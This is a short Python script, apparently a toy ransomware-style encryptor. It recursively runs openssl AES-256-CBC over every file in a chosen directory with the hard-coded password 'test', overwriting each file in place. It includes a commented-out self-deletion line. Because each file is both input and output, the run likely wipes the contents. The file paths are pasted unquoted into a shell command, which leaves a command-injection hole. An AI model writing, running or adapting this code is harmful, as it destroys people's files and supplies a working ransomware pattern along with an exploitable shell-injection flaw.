#!/usr/bin/env python3 
import sys
import os
import subprocess


if len(sys.argv) > 1:

	dir_path = sys.argv[1]
	
	#build list of files from selected directory
	file_list=[]
	for root,dirs,files in os.walk(dir_path):
		for file in files:
			file_list.append(os.path.join(root, file))

	#encryption of all the files with "test" password (keep it !!!)
	for file in file_list:
		cmd = "openssl enc -e -aes-256-cbc -iter 10000 -pass pass:'test' -in " + file + " -out " + file
		subprocess.run(cmd, shell=True)
		print("File encrypted :", file) 

		#delete script file
		#os.remove(__file__)
else :
	print("Please select a directory to encrypt files")
